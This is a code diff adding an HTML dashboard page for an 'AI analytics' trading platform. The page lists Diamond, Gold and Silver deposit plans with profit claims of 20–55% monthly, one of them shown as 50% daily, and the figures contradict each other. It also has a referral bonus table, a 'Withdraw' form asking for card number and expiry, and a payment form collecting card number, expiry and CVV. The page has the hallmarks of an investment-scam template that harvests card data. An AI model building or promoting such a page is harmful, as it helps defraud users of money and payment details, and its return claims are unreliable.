@@ -1,0 +1,2286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="css/bootstrap.min.css">
+	<link rel="stylesheet" href="css/splide.min.css">
+	<link rel="stylesheet" href="css/main.css">
+
+	<!-- Icon font -->
+	<link rel="stylesheet" href="webfont/tabler-icons.min.css">
+
+	<!-- Favicons -->
+	<link rel="icon" type="image/png" href="icon/favicon-32x32.png" sizes="32x32">
+	<link rel="apple-touch-icon" href="icon/favicon-32x32.png">
+
+	<meta name="description" content="AI analytics trading made simple">
+	<meta name="keywords" content="">
+
+	<title>AI analytics – AI analytics trading made simple</title>
+</head>
+
+<body class="body" onload="preload()">
+
+
+
+
+
+
+	
+	
+	
+	
+
+
+
+	  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+	
+	
+	<div id="preloader"><svg class="ip" viewBox="0 0 256 128" width="256px" height="128px" xmlns="http://www.w3.org/2000/svg">
+		<defs>
+			<linearGradient id="grad1" x1="0" y1="0" x2="1" y2="0">
+				<stop offset="0%" stop-color="#5ebd3e" />
+				<stop offset="33%" stop-color="#ffb900" />
+				<stop offset="67%" stop-color="#f78200" />
+				<stop offset="100%" stop-color="#e23838" />
+			</linearGradient>
+			<linearGradient id="grad2" x1="1" y1="0" x2="0" y2="0">
+				<stop offset="0%" stop-color="#e23838" />
+				<stop offset="33%" stop-color="#973999" />
+				<stop offset="67%" stop-color="#009cdf" />
+				<stop offset="100%" stop-color="#5ebd3e" />
+			</linearGradient>
+		</defs>
+		<g fill="none" stroke-linecap="round" stroke-width="16">
+			<g class="ip__track" stroke="#ddd">
+				<path d="M8,64s0-56,60-56,60,112,120,112,60-56,60-56"/>
+				<path d="M248,64s0-56-60-56-60,112-120,112S8,64,8,64"/>
+			</g>
+			<g stroke-dasharray="180 656">
+				<path class="ip__worm1" stroke="url(#grad1)" stroke-dashoffset="0" d="M8,64s0-56,60-56,60,112,120,112,60-56,60-56"/>
+				<path class="ip__worm2" stroke="url(#grad2)" stroke-dashoffset="358" d="M248,64s0-56-60-56-60,112-120,112S8,64,8,64"/>
+			</g>
+		</g>
+	</svg></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="body1">
+
+	<!-- header -->
+	<header class="header" id="headtop">
+		<div class="container" id="body1">
+			<div class="row">
+				<div class="col-12">
+					<div class="header__content">
+						<!-- btn -->
+						<button class="header__btn" type="button" aria-label="header__nav">
+							<span></span>
+							<span></span>
+							<span></span>
+						</button>
+						<!-- end btn -->
+
+						<!-- logo -->
+						<a href="index.html" class="header__logo">
+							<img src="img/logo.svg" alt="">
+						</a>
+						<!-- end logo -->
+
+						<!-- tagline -->
+						<span class="header__tagline">AI analytics <br></span>
+						<!-- end tagline -->
+
+						
+						
+							<div onclick="toggleDropdown()" class="profile-btn" id="displayName">AB<</div>
+							<span class="arrow" id="arrowhide">&#9664;</span>
+					
+							 <!-- profile -->
+						<div id="dropdown" >
+							 <a class="logoutb" href="signin.html"  onclick="logoutUser()">
+							<i></i>
+							<span>Log out</span>
+						     </a>
+					   </div>
+					
+						  
+
+
+						
+
+						
+						<!-- end profile -->
+						
+					</div>
+					
+				</div>
+				
+			</div>
+		</div>
+	</header>
+	<!-- end header -->
+
+	<!-- head -->
+	<div class="section section--head">
+		<div class="container">
+			<div class="row">
+				<!-- title -->
+				<div class="col-12">
+					<div class="section__title">
+						<h1 id="replaceMe">My profile</h1>
+					</div>
+				</div>
+				<!-- end title -->
+			</div>
+		</div>
+	</div>
+	<!-- end head -->
+
+	<!-- profile -->
+	<div class="section">
+		<div class="container">
+			<div class="row">
+				<!-- tabs nav -->
+				<div class="col-12 col-lg-3">
+					<div class="section__tabs-profile">
+						<ul class="nav nav-tabs section__tabs section__tabs--big section__tabs--profile" id="section__tabs" role="tablist">
+							<li class="nav-item" role="presentation">
+								<button class="active" data-bs-toggle="tab" data-bs-target="#tab-1" type="button" role="tab" aria-controls="tab-1" aria-selected="true">Dashboard</button>
+							</li>
+
+							<li class="nav-item" role="presentation">
+								<button data-bs-toggle="tab" data-bs-target="#tab-2" type="button" role="tab" aria-controls="tab-2" aria-selected="false">Investing</button>
+							</li>
+
+							
+
+							<li class="nav-item" role="presentation">
+								<button data-bs-toggle="tab" data-bs-target="#tab-4" type="button" role="tab" aria-controls="tab-4" aria-selected="false">Withdraw</button>
+							</li>
+
+							<li class="nav-item" role="presentation">
+								<button data-bs-toggle="tab" data-bs-target="#tab-5" type="button" role="tab" aria-controls="tab-5" aria-selected="false">Settings</button>
+							</li>
+						</ul>
+
+						<!-- design elements -->
+						<span class="screw screw--big-br screw--tablet"></span>
+						<span class="screw screw--big-bl screw--tablet"></span>
+						<span class="screw screw--big-tr screw--tablet"></span>
+						<span class="screw screw--big-tl screw--tablet"></span>
+					</div>
+				</div>
+				<!-- end tabs nav -->
+
+				<!-- tabs content -->
+				<div class="col-12 col-lg-9">
+					<div class="tab-content">
+						<!-- dashboard -->
+						<div class="tab-pane fade show active" id="tab-1" role="tabpanel">
+							<div class="row">
+								<div class="col-12 col-md-4">
+									<!-- stats -->
+									<div class="stats">
+										<span class="stats__value" id="balance">$0.00</span>
+										<p class="stats__name">Balance</p>
+
+										<!-- design elements -->
+										<span class="stats__dodger stats__dodger--left stats__dodger--orange"></span>
+										<span class="stats__dodger stats__dodger--right stats__dodger--orange"></span>
+									</div>
+									<!-- end stats -->
+								</div>
+
+								<div class="col-12 col-md-4">
+									<!-- stats -->
+									<div class="stats">
+										<span class="stats__value" id="depositamount">$0.00</span>
+										<p class="stats__name">Deposit amount</p>
+
+										<!-- design elements -->
+										<span class="stats__dodger stats__dodger--left stats__dodger--green"></span>
+										<span class="stats__dodger stats__dodger--right stats__dodger--green"></span>
+									</div>
+									<!-- end stats -->
+								</div>
+
+								<div class="col-12 col-md-4">
+									<!-- stats -->
+									<div class="stats">
+										<span class="stats__value" id="totalpaid">$0.00</span>
+										<p class="stats__name">Total withdrawn</p>
+
+										<!-- design elements -->
+										<span class="stats__dodger stats__dodger--left stats__dodger--blue"></span>
+										<span class="stats__dodger stats__dodger--right stats__dodger--blue"></span>
+									</div>
+									<!-- end stats -->
+								</div>
+
+
+								<div class="deposit" id="activediamond1">
+									<div class="deposit__name">
+										<span class="deposit__icon deposit__icon--orange">
+											<i class="ti ti-database-dollar"></i>
+										</span>
+										<h3 class="deposit__title">Diamond plan</h3>
+
+
+									</div>
+
+									<ul class="deposit__list">
+										<li>monthly profit (%): <b>50</b></li>
+										<li>Was opened: <b id="actdia">07.10.2018 12:22:44 PM</b></li>
+										<li>Remaining: <b>10 days</b></li>
+										<li>Deposit: <b>$2000</b></li>
+									</ul>
+
+									<div class="progressbar progressbar--orange">
+										<h3 class="progressbar__title">Accrued (%):</h3>
+										<div class="progress" role="progressbar" aria-label="Animated striped" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 75%"><span>80%</span></div></div>
+										<div class="progressbar__values">
+											<span class="progressbar__value progressbar__value--left">0%</span>
+											<span class="progressbar__value progressbar__value--right">100%</span>
+										</div>
+									</div>
+
+									<div class="deposit__profit">
+										<span>Profit</span>
+										<p>$1300</p>
+									</div>
+								</div>
+			
+
+
+
+
+
+
+
+
+
+								<div class="deposit" id="activegold1">
+									<div class="deposit__name">
+										<span class="deposit__icon deposit__icon--green">
+											<i class="ti ti-database-dollar"></i>
+										</span>
+										<h3 class="deposit__title">Gold plan</h3>
+
+									</div>
+
+									<ul class="deposit__list">
+										<li>Daily profit (%): <b>50</b></li>
+										<li>Was opened: <b id="purchsedate">01.10.2018 12:21:30 PM</b></li>
+										<li>Remaining: <b id="remdays">14 days</b></li>
+										<li>Deposit: <b>$1000</b></li>
+									</ul>
+
+									<div class="progressbar progressbar--green">
+										<h3 class="progressbar__title">Accrued (%):</h3>
+										<div class="progress" role="progressbar" aria-label="Animated striped" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" id="progressbarg"><div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 20%"><span  id="progressperg">20%</span></div></div>
+										<div class="progressbar__values">
+											<span class="progressbar__value progressbar__value--left"></span>
+											<span class="progressbar__value progressbar__value--right">100%</span>
+										</div>
+									</div>
+
+									<div class="deposit__profit">
+										<span>Profit(at the end of the month)</span>
+										<p>$500</p>
+									</div>
+								</div>
+
+
+
+								
+								
+
+								<!-- deposit -->
+		
+	
+
+
+
+
+								<div class="deposit" id="pendingapproval">
+									<div class="deposit__name">
+										<span class="deposit__icon deposit__icon--green">
+											<i class="ti ti-database-dollar"></i>
+										</span>
+										<h3 class="deposit__title">Pending Approval</h3>
+
+									</div>
+
+									<ul class="deposit__list">
+										<li>Withdraw Amount <b id="wamount"></b></li>
+										<li>Was opened: <b id="purchsedate">01.10.2018 12:21:30 PM</b></li>
+					
+									</ul>
+
+								</div>
+								<!-- end deposit -->
+
+								<!-- deposit -->
+								<div class="deposit" id="activesilver1">
+									<div class="deposit__name">
+										<span class="deposit__icon deposit__icon--blue">
+											<i class="ti ti-database-dollar"></i>
+										</span>
+										<h3 class="deposit__title">Silver plan</h3>
+									</div>
+
+									<ul class="deposit__list">
+										<li>money profit (%): <b>50</b></li>
+										<li>Was opened: <b id="purchsedate">02.10.2018 12:18:27 PM</b></li>
+										<li>Remaining: <b id="remdays"> days</b></li>
+										<li>Deposit: <b>$500</b></li>
+									</ul>
+
+									<div class="progressbar progressbar--blue">
+										<h3 class="progressbar__title">Accrued (%):</h3>
+										<div class="progress" role="progressbar" aria-label="Animated striped" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 33%"><span>33%</span></div></div>
+										<div class="progressbar__values">
+											<span class="progressbar__value progressbar__value--left">0%</span>
+											<span class="progressbar__value progressbar__value--right">100%</span>
+										</div>
+									</div>
+
+									<div class="deposit__profit">
+										<span>Profit</span>
+										<p>$49</p>
+									</div>
+								</div>
+								<!-- end deposit -->
+	
+
+
+
+
+
+							<!-- arbitrage pools -->
+							<div class="section" id="planz">
+								<div class="container">
+									<div class="row">
+										<div class="col-12 col-md-6 col-lg-4">
+											<!-- arbitrage pool -->
+											<div class="apool">
+												<h3 class="apool__title">Diamond <br> Plan</h3>
+						
+						
+						
+												<!-- tabs nav -->
+												<ul class="nav nav-tabs apool__tabs apool__tabs--orange" id="apool__tabs1" role="tablist">
+													<li class="nav-item" role="presentation">
+														<button class="active" data-bs-toggle="tab" data-bs-target="#atab-1" type="button" role="tab" aria-controls="atab-1" aria-selected="true">25 Days</button>
+													</li>
+						
+												</ul>
+												<!-- tabs nav -->
+						
+												<!-- tabs content -->
+												<div class="tab-content">
+													<div class="tab-pane fade show active" id="atab-1" role="tabpanel">
+														<div class="apool__content">
+															<span class="apool__value">$2000</span>
+															<span class="apool__profit">monthly profit (%): <b>50-55</b></span>
+														</div>
+													</div>
+						
+													
+												</div>
+												<!-- end tabs content -->
+						
+												
+						
+												<button class="apool__btn" data-bs-target="#modal-apool" type="button" data-bs-toggle="modal" onclick=" currentactivepland()">Invest</button>
+												
+												<!-- design elements -->
+												<span class="block-icon block-icon--orange">
+													<i class="ti ti-database-dollar"></i>
+												</span>
+												<span class="screw screw--lines-tr"></span>
+											</div>
+											<!-- end arbitrage pool -->
+										</div>
+						
+										<div class="col-12 col-md-6 col-lg-4">
+											<!-- arbitrage pool -->
+											<div class="apool">
+												<h3 class="apool__title">Gold <br> plan</h3>
+						
+						
+												<!-- tabs nav -->
+												<ul class="nav nav-tabs apool__tabs apool__tabs--green" id="apool__tabs2" role="tablist">
+													<li class="nav-item" role="presentation">
+														<button class="active" data-bs-toggle="tab" data-bs-target="#atab-3" type="button" role="tab" aria-controls="atab-3" aria-selected="true">30 Days</button>
+													</li>
+						
+													
+												</ul>
+												<!-- tabs nav -->
+						
+												<!-- tabs content -->
+												<div class="tab-content">
+													<div class="tab-pane fade show active" id="atab-3" role="tabpanel">
+														<div class="apool__content">
+															<span class="apool__value">$1000</span>
+															<span class="apool__profit">monthly profit (%): <b>30-40</b></span>
+														</div>
+													</div>
+						
+													
+												</div>
+												<!-- end tabs content -->
+						
+												
+						
+												<button class="apool__btn" data-bs-target="#modal-apool" type="button" data-bs-toggle="modal" onclick="currentactiveplang()">Invest</button>
+												
+												<!-- design elements -->
+												<span class="block-icon block-icon--green">
+													<i class="ti ti-database-dollar"></i>
+												</span>
+												<span class="screw screw--lines-tr"></span>
+											</div>
+											<!-- end arbitrage pool -->
+										</div>
+						
+										<div class="col-12 col-lg-4">
+											<!-- arbitrage pool -->
+											<div class="apool">
+												<h3 class="apool__title">Silver <br> plan</h3>
+						
+												<!-- tabs nav -->
+												<ul class="nav nav-tabs apool__tabs apool__tabs--blue" id="apool__tabs3" role="tablist">
+													<li class="nav-item" role="presentation">
+														<button class="active" data-bs-toggle="tab" data-bs-target="#atab-5" type="button" role="tab" aria-controls="atab-5" aria-selected="true">30 days</button>
+													</li>
+						
+													
+												</ul>
+												<!-- tabs nav -->
+						
+												<!-- tabs content -->
+												<div class="tab-content">
+													<div class="tab-pane fade show active" id="atab-5" role="tabpanel">
+														<div class="apool__content">
+															<span class="apool__value">$500</span>
+															<span class="apool__profit">monthly profit (%): <b>20-30</b></span>
+														</div>
+													</div>
+						
+													
+												</div>
+												<!-- end tabs content -->
+						
+												
+						
+												<button class="apool__btn" data-bs-target="#modal-apool" type="button" data-bs-toggle="modal" onclick="currentactiveplans()">Invest</button>
+												
+												<!-- design elements -->
+												<span class="block-icon block-icon--blue">
+													<i class="ti ti-database-dollar"></i>
+												</span>
+												<span class="screw screw--lines-tr"></span>
+											</div>
+											<!-- end arbitrage pool -->
+										</div>
+									</div>
+								</div>
+							</div>
+							<!-- end arbitrage pools -->
+
+
+
+
+
+
+
+
+
+	<!-- head -->
+	<div class="section section--head">
+		<div class="container">
+			<div class="row">
+				<!-- title -->
+				<div class="col-12 col-md-10 offset-md-1 col-lg-6 offset-lg-3">
+					<div class="section__title">
+						<h1>Benefit from trading with experts</h1>
+						<p>Unlock the full potential of your investment journey with AI Analytics.</p>
+					</div>
+				</div>
+				<!-- end title -->
+			</div>
+		</div>
+	</div>
+	<!-- end head -->
+
+	<!-- about -->
+	<div class="section section--pb">
+		<div class="container">
+			<div class="row row--relative">
+				<div class="col-12">
+					<div class="about">
+						<h2 class="about__title">Why invest in AI analytics</h2>
+
+						<p class="about__text">A team of seasoned traders stands ready to equip you with exclusive insights, proven strategies, and bespoke recommendations. </p>
+
+						<p class="about__text">Our cadre of financial advisors, boasting 10-15 years of trading mastery, is committed to not only minimizing your individual risks but also elevating your profit margins. Experience the pinnacle of trading sophistication as we empower you to navigate the global markets with confidence and precision.</p>
+						
+						<!-- design elements -->
+						<span class="block-icon block-icon--purple">
+							<i class="ti ti-topology-star-2"></i>
+						</span>
+						<span class="screw screw--lines-bl"></span>
+						<span class="screw screw--lines-br"></span>
+						<span class="screw screw--lines-tr"></span>
+					</div>
+				</div>
+
+				<!-- animation background -->
+				<div class="section__canvas section__canvas--page section__canvas--first" id="canvas"></div>
+			</div>
+		</div>
+	</div>
+	<!-- end about -->
+	
+								<div class="col-12">
+									<!-- referral -->
+									<div class="invest invest--big">
+										<h2 class="invest__title">Referral link</h2>
+
+										<div class="invest__group">
+											<input id="partnerlink" type="text" name="partnerlink" class="form__input" value="https://partnerlink.centure">
+										</div>
+
+										<p class="invest__text">Your referral bonus is 1%. Open a deposit of $1000 or more to increase your referral bonus to 3%.</p>
+
+										<table class="invest__table">
+											<thead>
+												<tr>
+													<th>Action</th>
+													<th>Value</th>
+												</tr>
+											</thead>
+											<tbody>
+												<tr>
+													<td>Today's registrations</td>
+													<td>1</td>
+												</tr>
+												<tr>
+													<td>Today's clicks</td>
+													<td>9</td>
+												</tr>
+												<tr>
+													<td>Total registrations</td>
+													<td>21</td>
+												</tr>
+												<tr>
+													<td>Total clicks</td>
+													<td>503</td>
+												</tr>
+												<tr>
+													<td class="yellow">Total referrals</td>
+													<td>12</td>
+												</tr>
+											</tbody>
+										</table>
+
+										<!-- design elements -->
+										<span class="block-icon block-icon--yellow">
+											<i class="ti ti-user-plus"></i>
+										</span>
+										<span class="screw screw--lines-bl"></span>
+										<span class="screw screw--lines-br"></span>
+										<span class="screw screw--lines-tr"></span>
+									</div>
+									<!-- end referral -->
+								</div>
+							</div>
+						</div>
+						<!-- end dashboard -->
+
+						<!-- investing -->
+						<div class="tab-pane fade" id="tab-2" role="tabpanel">
+							<div class="row">
+								<div class="col-12">
+									<!-- profile -->
+									<div class="profile">
+										<!-- tabs nav -->
+										<ul class="nav nav-tabs section__tabs section__tabs--left" id="section__profile-tabs1" role="tablist">
+											<li class="nav-item" role="presentation">
+												<button class="active" data-bs-toggle="tab" data-bs-target="#tab-f1" type="button" role="tab" aria-controls="tab-f1" aria-selected="true">Active</button>
+											</li>
+
+											<li class="nav-item" role="presentation">
+												<button data-bs-toggle="tab" data-bs-target="#tab-f2" type="button" role="tab" aria-controls="tab-f2" aria-selected="false">Closed</button>
+											</li>
+
+										</ul>
+										<!-- end tabs nav -->
+
+										<!-- tabs content -->
+										<div class="tab-content">
+											<!-- active -->
+											<div class="tab-pane fade show active" id="tab-f1" role="tabpanel">
+												<div class="row">
+													<div class="col-12" id="activeplans">
+														<div class="profile__info"id="info">
+															<p><i class="ti ti-info-circle"></i> No active plan detected</p>
+														</div>
+														<!-- deposit -->
+														<div class="deposit" id="activediamond">
+															<div class="deposit__name">
+																<span class="deposit__icon deposit__icon--orange">
+																	<i class="ti ti-database-dollar"></i>
+																</span>
+																<h3 class="deposit__title">Diamond plan</h3>
+
+
+															</div>
+
+															<ul class="deposit__list">
+																<li>monthly profit (%): <b>50</b></li>
+																<li>Was opened: <b id="actdia">07.10.2018 12:22:44 PM</b></li>
+																<li>Remaining: <b>10 days</b></li>
+																<li>Deposit: <b>$2000</b></li>
+															</ul>
+
+															<div class="progressbar progressbar--orange">
+																<h3 class="progressbar__title">Accrued (%):</h3>
+																<div class="progress" role="progressbar" aria-label="Animated striped" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 75%"><span>80%</span></div></div>
+																<div class="progressbar__values">
+																	<span class="progressbar__value progressbar__value--left">0%</span>
+																	<span class="progressbar__value progressbar__value--right">100%</span>
+																</div>
+															</div>
+
+															<div class="deposit__profit">
+																<span>Profit</span>
+																<p>$1300</p>
+															</div>
+														</div>
+														<!-- end deposit -->
+
+
+
+
+
+
+														<!-- deposit -->
+														<div class="deposit" id="activegold">
+															<div class="deposit__name">
+																<span class="deposit__icon deposit__icon--green">
+																	<i class="ti ti-database-dollar"></i>
+																</span>
+																<h3 class="deposit__title">Gold plan</h3>
+						
+															</div>
+						
+															<ul class="deposit__list">
+																<li>Daily profit (%): <b>50</b></li>
+																<li>Was opened: <b id="purchsedateg">01.10.2018 12:21:30 PM</b></li>
+																<li>Remaining: <b id="remdaysg">14 days</b></li>
+																<li>Deposit: <b>$1000</b></li>
+															</ul>
+						
+															<div class="progressbar progressbar--green">
+																<h3 class="progressbar__title">Accrued (%):</h3>
+																<div class="progress" role="progressbar" aria-label="Animated striped" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar progress-bar-striped progress-bar-animated" id="progressbar" style="width: 70%" ><span id="progressper">20%</span></div></div>
+																<div class="progressbar__values">
+																	<span class="progressbar__value progressbar__value--left"></span>
+																	<span class="progressbar__value progressbar__value--right">100%</span>
+																</div>
+															</div>
+						
+															<div class="deposit__profit">
+																<span>Profit(at the end of the month)</span>
+																<p>$500</p>
+															</div>
+														</div>
+														<!-- end deposit -->
+
+														<!-- deposit -->
+														<div class="deposit" id="activesilver">
+															<div class="deposit__name">
+																<span class="deposit__icon deposit__icon--blue">
+																	<i class="ti ti-database-dollar"></i>
+																</span>
+																<h3 class="deposit__title">Silver plan</h3>
+															</div>
+
+															<ul class="deposit__list">
+																<li>Daily profit (%): <b>0.24</b></li>
+																<li>Was opened: <b id="purchsedate">02.10.2018 12:18:27 PM</b></li>
+																<li>Remaining: <b>20 days</b></li>
+																<li>Deposit: <b>$300</b></li>
+															</ul>
+
+															<div class="progressbar progressbar--blue">
+																<h3 class="progressbar__title">Accrued (%):</h3>
+																<div class="progress" role="progressbar" aria-label="Animated striped" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 33%"><span>33%</span></div></div>
+																<div class="progressbar__values">
+																	<span class="progressbar__value progressbar__value--left">0%</span>
+																	<span class="progressbar__value progressbar__value--right">100%</span>
+																</div>
+															</div>
+
+															<div class="deposit__profit">
+																<span>Profit</span>
+																<p>$49</p>
+															</div>
+														</div>
+														<!-- end deposit -->
+													</div>
+												</div>
+											</div>
+											<!-- active -->
+
+
+
+
+
+
+
+
+
+
+											<!-- closed -->
+											<div class="tab-pane fade" id="tab-f2" role="tabpanel">
+												<div class="row">
+													<div class="col-12">
+														<!-- info -->
+														<div class="profile__info">
+															<p><i class="ti ti-info-circle"></i> No closed deposits detected</p>
+														</div>
+														<!-- end info -->
+													</div>
+												</div>
+											</div>
+											<!-- end closed -->
+
+										
+										</div>
+										<!-- end tabs content -->
+										
+										<!-- design elements -->
+										<span class="screw screw--lines-bl"></span>
+										<span class="screw screw--lines-br"></span>
+										<span class="screw screw--lines-tr"></span>
+										<span class="screw screw--lines-tl"></span>
+									</div>
+									<!-- end profile -->
+								</div>
+							</div>
+						</div>
+					
+				
+				
+						<!-- end investing -->
+
+					
+
+						<!-- withdraw -->
+						<div class="tab-pane fade" id="tab-4" role="tabpanel">
+							<div class="row">
+								<div class="col-12">
+									<!-- profile -->
+									<div class="profile">
+										<div class="row">
+											<div class="col-12">
+												<h3 class="profile__title profile__title--mt">Withdraw</h3>
+											</div>
+
+											<div class="col-12 col-xl-6">
+												<div class="form__group">
+													<label for="method1" class="form__label">Payment method</label>
+													<select name="method1" id="method1" class="form__select">
+														
+														<option value="2">Visa</option>
+														<option value="3">Mastercard</option>
+														
+													</select>
+												</div>
+											</div>
+
+											<div class="col-12 col-xl-6">
+												<div class="form__group">
+													<label for="amount4" class="form__label">Enter amount</label>
+													<input id="amount4ab" type="number" name="amount4" class="apool__input">
+												</div>
+											</div>
+
+											<div class="col-12 col-xl-12">
+												<div class="form__group">
+													<label for="wallet0" class="form__label">Cardholder Name</label>
+													<input name="wallet0" id="cname1ab" class="form__input" type="number">
+												</div>
+											</div>
+
+											<div class="col-12 col-xl-6">
+												<div class="form__group">
+													<label for="method1" class="form__label">Card number</label>
+													<input id="ccnum1ab" type="number" name="amount4" class="form__input">
+										
+												</div>
+											</div>
+
+											<div class="col-12 col-xl-6">
+												<div class="form__group">
+													<label for="amount4" class="form__label">Expiration Month</label>
+													<input id="expmonthab"  name="amount4" class="form__input">
+
+													<label for="amount4" class="form__label">Expiration year</label>
+													<input id="expyearab"  name="amount4" class="form__input">
+												</div>
+											</div>
+
+											<div class="col-12">
+												<button class="form__btn form__btn--small"  type="button" onclick="withdrawfunc()">Next</button>
+											</div>
+										</div>
+
+										<!-- design elements -->
+										<span class="screw screw--lines-bl"></span>
+										<span class="screw screw--lines-br"></span>
+										<span class="screw screw--lines-tr"></span>
+										<span class="screw screw--lines-tl"></span>
+									</div>
+									<!-- end profile -->
+								</div>
+							</div>
+						</div>
+						<!-- end withdraw -->
+
+						<!-- settings -->
+						<div class="tab-pane fade" id="tab-5" role="tabpanel">
+							<div class="row">
+								<div class="col-12">
+									<!-- profile -->
+									<div class="profile">
+										<!-- tabs nav -->
+										<ul class="nav nav-tabs section__tabs section__tabs--left" id="section__profile-tabs3" role="tablist">
+											<li class="nav-item" role="presentation">
+												<button class="active" data-bs-toggle="tab" data-bs-target="#tab-f6" type="button" role="tab" aria-controls="tab-f6" aria-selected="true">Profile</button>
+											</li>
+
+											<li class="nav-item" role="presentation">
+												<button data-bs-toggle="tab" data-bs-target="#tab-f7" type="button" role="tab" aria-controls="tab-f7" aria-selected="false">Email</button>
+											</li>
+
+											<li class="nav-item" role="presentation">
+												<button data-bs-toggle="tab" data-bs-target="#tab-f8" type="button" role="tab" aria-controls="tab-f8" aria-selected="false">Password</button>
+											</li>
+										</ul>
+										<!-- end tabs nav -->
+
+										<!-- tabs content -->
+										<div class="tab-content">
+											<!-- profile -->
+											<div class="tab-pane fade show active" id="tab-f6" role="tabpanel">
+												<div class="row">
+													<div class="col-12">
+														<h3 class="profile__title">Personal information</h3>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="name1" class="form__label">firstname</label>
+															<input id="name1" type="text" name="name1" class="form__input">
+														</div>
+													</div>
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="name2" class="form__label">lastname</label>
+															<input id="name2" type="text" name="name1" class="form__input">
+														</div>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="phone1" class="form__label">Phone</label>
+															<input id="phone1" type="number" name="phone1" class="form__input">
+														</div>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="telegram1" class="form__label">Telegram</label>
+															<input id="telegram1" type="text" name="telegram1" class="form__input">
+														</div>
+													</div>
+
+													<div class="col-12">
+														<button class="form__btn form__btn--small" type="button" onclick="updateProfile()">Save</button>
+													</div>
+												</div>
+											</div>
+											<!-- profile -->
+
+											<div class="tab-pane fade" id="tab-f7" role="tabpanel">
+												<div class="row">
+													<div class="col-12">
+														<h3 class="profile__title">change email</h3>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="name1" class="form__label">Email</label>
+															<input id="email1" type="text" name="email1" class="form__input">
+														</div>
+													</div>
+													
+													<div class="col-12">
+														<button class="form__btn form__btn--small" type="button" onclick="updateProfile()">Save</button>
+													</div>
+												</div>
+											</div>
+											<!-- password -->
+											<div class="tab-pane fade" id="tab-f8" role="tabpanel">
+												<div class="row">
+													<div class="col-12">
+														<h3 class="profile__title">Change password</h3>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="op1" class="form__label">Old password</label>
+															<input id="op1" type="password" name="op1" class="form__input">
+														</div>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="np1" class="form__label">New password</label>
+															<input id="np1" type="password" name="np1" class="form__input">
+														</div>
+													</div>
+
+													<div class="col-12 col-xl-6">
+														<div class="form__group">
+															<label for="cnp1" class="form__label">Confirm new password</label>
+															<input id="cnp1" type="password" name="cnp1" class="form__input">
+														</div>
+													</div>
+
+													<div class="col-12">
+														<button class="form__btn form__btn--small" type="button" onclick="updateProfile()">Save</button>
+													</div>
+												</div>
+											</div>
+											<!-- end password -->
+										</div>
+										<!-- end tabs content -->
+										
+										<!-- design elements -->
+										<span class="screw screw--lines-bl"></span>
+										<span class="screw screw--lines-br"></span>
+										<span class="screw screw--lines-tr"></span>
+										<span class="screw screw--lines-tl"></span>
+									</div>
+									<!-- end profile -->
+								</div>
+							</div>
+						</div>
+						<!-- end settings -->
+					</div>
+				</div>
+				<!-- end tabs content -->
+			</div>
+		</div>
+	</div>
+	<!-- end profile -->
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="row" id="paymentdiv">
+	<div class="col-12">
+	  <div class="container1">
+		 
+		<form>
+		
+		  
+  
+			<div class="col-50">
+			  <h3>Payment</h3>
+			  <label for="fname">Accepted Cards</label>
+			  <div class="icon-container">
+				<i class="fa fa-cc-visa" style="color:navy;"></i>
+				<i class="fa fa-cc-amex" style="color:blue;"></i>
+				<i class="fa fa-cc-mastercard" style="color:red;"></i>
+				<i class="fa fa-cc-discover" style="color:orange;"></i>
+			  </div>
+			  <label for="cname">Name on Card</label>
+			  <input type="text" id="cname" name="cardname" placeholder="John More Doe">
+			  <label for="ccnum">Credit card number</label>
+			  <input type="text" id="ccnum" name="cardnumber" placeholder="1111-2222-3333-4444">
+			  <label for="expmonth">Exp Month</label>
+			  <input type="text" id="expmonth" name="expmonth" placeholder="September">
+			  <div class="row">
+				<div class="col-50">
+				  <label for="expyear">Exp Year</label>
+				  <input type="text" id="expyear" name="expyear" placeholder="2018">
+				</div>
+				<div class="col-50">
+				  <label for="cvv">CVV</label>
+				  <input type="text" id="cvv" name="cvv" placeholder="352">
+				</div>
+			  </div>
+			</div>
+			<div class="col-25">
+			  <div class="container">
+				<h4>Plan <span class="price" style="color:black"></span></h4>
+				<p><a href="#" id="plantext"></a> <span class="price" id="planprice">$</span></p>
+			  
+				<hr>
+				<p>Total <span class="price" style="color:black"><b id="plantotal">$</b></span></p>
+			  </div>
+			</div>
+			
+			<input type="button" value="Pay" class="btn" onclick="plan_purchasing()">
+		</form>
+		  </div>
+		 
+		
+	  </div>
+	</div>
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<!-- footer -->
+	<footer class="footer" id="footer">
+		<div class="container">
+			<div class="row">
+				<div class="col-12 col-sm-8 col-md-6 col-lg-6 col-xl-4 order-1 order-lg-4 order-xl-1">
+					<!-- footer logo -->
+					<div class="footer__logo">
+						<img src="img/logo.svg" alt="">
+					</div>
+					<!-- end footer logo -->
+
+					<!-- footer tagline -->
+					<p class="footer__tagline">The AI analytics team works hard <br>to deliver exceptional financial results <br>and increase our clients' revenue.</p>
+					<!-- end footer tagline -->
+
